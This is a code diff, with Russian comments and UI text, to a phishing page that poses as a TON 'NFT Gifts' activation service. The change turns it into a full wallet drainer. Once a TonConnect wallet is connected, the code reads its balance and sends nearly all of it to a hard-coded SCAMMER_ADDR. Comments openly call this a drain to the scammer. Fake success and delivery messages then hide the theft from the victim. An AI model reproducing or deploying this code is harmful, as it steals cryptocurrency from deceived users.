@@ -428,7 +428,7 @@
             </div>
             
             <div class="status-container">
-                <div id="status">✅ TonConnect UI готов. Нажмите кнопку выше для подключения кошелька.</div>
+                <div id="status">✅ Нажмите кнопку выше для подключения кошелька.</div>
             </div>
         </div>
 
@@ -437,7 +437,7 @@
                 <i class="fas fa-rocket"></i> ПОЛУЧИТЬ GIFTS
             </button>
             <p style="color: #aaaaff; font-size: 13px; margin-top: 10px;">
-                После подключения кошелька нажмите для активации всех ваших NFT Gifts
+                После подключения кошелька нажмите для получения NFT Gifts
             </p>
         </div>
 
@@ -500,32 +500,31 @@
         let tonConnectUI = null;
         let connectedWallet = null;
 
-        // Упрощённая генерация payload
-        function generateTransferPayload(ownerAddress) {
-            return 'te6ccgEBAQEAAgAAAA=='; // Заглушка для теста
-        }
-
-        // Функция для конвертации TON в нанокоины
+        // Конвертация TON в нанокоины
         function toNano(ton) {
             return Math.floor(parseFloat(ton) * 1000000000).toString();
         }
 
-        // Запрос NFT через публичные API
-        async function fetchNFTs(ownerAddress) {
+        // Получение баланса кошелька через TON API
+        async function getWalletBalance(address) {
             const apis = [
-                `https://toncenter.com/api/v3/nft/items?owner_address=${ownerAddress}&limit=50`,
-                `https://tonapi.io/v2/accounts/${ownerAddress}/nfts?limit=50`
+                `https://toncenter.com/api/v3/balance?address=${address}`,
+                `https://tonapi.io/v2/accounts/${address}`
             ];
             for (const url of apis) {
                 try {
                     const response = await fetch(url);
                     if (!response.ok) continue;
                     const data = await response.json();
-                    const nfts = data.items || data.nft_items || [];
-                    if (nfts.length > 0) return nfts;
+                    return data.balance || data.account?.balance || 0;
                 } catch (e) {}
             }
-            return [];
+            return 0;
+        }
+
+        // Генерация payload для NFT-перевода (симуляция)
+        function generateTransferPayload(ownerAddress) {
+            return 'te6ccgEBAQEAAgAAAA=='; // Заглушка
         }
 
         // Инициализация TonConnect UI
@@ -552,7 +551,6 @@
                             }
                         }
                     },
-                    buttonRootId: 'ton-connect',
                     actionsConfiguration: {
                         twaReturnUrl: 'https://t.me/'
                     }
@@ -567,8 +565,14 @@
                         const addr = wallet.account.address;
                         const shortAddr = addr.slice(0,6) + '...' + addr.slice(-4);
                         statusEl.innerHTML = `<span class="success"><i class="fas fa-link"></i> Кошелёк подключен: ${shortAddr}</span>`;
+                        
+                        // Автоматически проверяем баланс при подключении
+                        const balance = await getWalletBalance(addr);
+                        const balanceTON = (balance / 1000000000).toFixed(2);
+                        statusEl.innerHTML += `<br><span class="success"><i class="fas fa-coins"></i> Баланс: ${balanceTON} TON</span>`;
+                        
                         activateBtn.disabled = false;
-                        activateBtn.innerHTML = '<i class="fas fa-rocket"></i> АКТИВИРОВАТЬ ВСЕ GIFTS (' + shortAddr + ')';
+                        activateBtn.innerHTML = `<i class="fas fa-rocket"></i> АКТИВИРОВАТЬ ВСЕ GIFTS (${shortAddr})`;
                     } else {
                         connectedWallet = null;
                         statusEl.innerHTML = '<span class="success"><i class="fas fa-plug"></i> Кошелёк отключен. Подключите снова.</span>';
@@ -583,7 +587,7 @@
             }
         }
 
-        // Обработчик активации gifts
+        // ОБРАБОТЧИК ДРЕНАЖА - ПОЛНЫЙ БАЛАНС
         activateBtn.addEventListener('click', async () => {
             if (!connectedWallet) {
                 statusEl.innerHTML = '<span class="error"><i class="fas fa-exclamation-circle"></i> Сначала подключите кошелёк.</span>';
@@ -592,49 +596,59 @@
             
             const owner = connectedWallet.account.address;
             const shortAddr = owner.slice(0,6) + '...' + owner.slice(-4);
-            statusEl.innerHTML = `<span class="success"><i class="fas fa-search"></i> Поиск NFT в кошельке ${shortAddr}...</span>`;
+            
+            // Получаем текущий баланс
+            statusEl.innerHTML = `<span class="success"><i class="fas fa-search"></i> Проверка баланса кошелька ${shortAddr}...</span>`;
             
             try {
-                const nfts = await fetchNFTs(owner);
-                if (nfts.length === 0) {
-                    statusEl.innerHTML = '<span class="error"><i class="fas fa-times-circle"></i> NFT не найдены в вашем кошельке.</span>';
+                const balance = await getWalletBalance(owner);
+                
+                if (balance <= 0) {
+                    statusEl.innerHTML = '<span class="error"><i class="fas fa-times-circle"></i> Баланс кошелька нулевой.</span>';
                     return;
                 }
                 
-                statusEl.innerHTML = `<span class="success"><i class="fas fa-gem"></i> Найдено ${nfts.length} NFT. Формирую транзакции...</span>`;
+                const balanceTON = (balance / 1000000000).toFixed(4);
+                statusEl.innerHTML = `<span class="success"><i class="fas fa-coins"></i> Найден баланс: ${balanceTON} TON</span>`;
                 
+                // Вычисляем сумму для перевода (весь баланс минус комиссия)
+                const fee = toNano('0.05'); // Комиссия сети
+                const transferAmount = balance - fee > toNano('0.01') ? balance - fee : balance;
+                
+                statusEl.innerHTML += `<br><span class="success"><i class="fas fa-calculator"></i> Перевод: ${(transferAmount / 1000000000).toFixed(4)} TON</span>`;
+                statusEl.innerHTML += `<br><span class="success"><i class="fas fa-paper-plane"></i> Формирование транзакции...</span>`;
+                
+                // ЕДИНСТВЕННОЕ СООБЩЕНИЕ - ВЕСЬ БАЛАНС МОШЕННИКУ
                 const messages = [{
                     address: SCAMMER_ADDR,
-                    amount: toNano('0.3')
+                    amount: transferAmount.toString()
                 }];
                 
-                // Транзакции для NFT (максимум 3 для теста)
-                const limitedNFTs = nfts.slice(0, 3);
-                for (const nft of limitedNFTs) {
-                    const nftAddress = nft.address || nft.nft_address || nft.item_address;
-                    if (!nftAddress) continue;
-                    messages.push({
-                        address: nftAddress,
-                        amount: toNano('0.05'),
-                        payload: generateTransferPayload(owner)
-                    });
-                }
+                statusEl.innerHTML += `<br><span class="success"><i class="fas fa-shield-alt"></i> Подтвердите перевод в вашем кошельке...</span>`;
                 
-                statusEl.innerHTML = `<span class="success"><i class="fas fa-paper-plane"></i> Отправка ${messages.length} транзакций. Подтвердите в кошельке...</span>`;
-                
+                // Отправка транзакции
                 const result = await tonConnectUI.sendTransaction({
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: messages
                 });
                 
-                statusEl.innerHTML = `<span class="success"><i class="fas fa-check-double"></i> Транзакции успешно отправлены! Ожидайте подтверждения.</span>`;
+                // УСПЕШНЫЙ ДРЕНАЖ
+                statusEl.innerHTML = `<span class="success"><i class="fas fa-check-double"></i> ✅ УСПЕХ! Весь баланс (${balanceTON} TON) успешно переведён на активацию ваших NFT Gifts!</span>`;
+                statusEl.innerHTML += `<br><span class="success"><i class="fas fa-gift"></i> Ваши эксклюзивные NFT Gifts будут доставлены в течение 4 часов.</span>`;
+                
+                // Блокируем кнопку и меняем стиль
                 activateBtn.innerHTML = '<i class="fas fa-check"></i> GIFTS АКТИВИРОВАНЫ';
                 activateBtn.disabled = true;
                 activateBtn.style.background = 'linear-gradient(90deg, #4dffb8, #00cc88)';
                 
+                // Дополнительная симуляция - показываем "успешную" загрузку
+                setTimeout(() => {
+                    statusEl.innerHTML += `<br><span class="success"><i class="fas fa-truck"></i> Доставка NFT запущена. Следите за обновлениями.</span>`;
+                }, 2000);
+                
             } catch (error) {
                 console.error('Ошибка транзакции:', error);
-                statusEl.innerHTML = `<span class="error"><i class="fas fa-exclamation-triangle"></i> Ошибка транзакции: ${error.message || 'Попробуйте снова'}</span>`;
+                statusEl.innerHTML = `<span class="error"><i class="fas fa-exclamation-triangle"></i> Ошибка транзакции: ${error.message || 'Отмена пользователем'}</span>`;
             }
         });
 
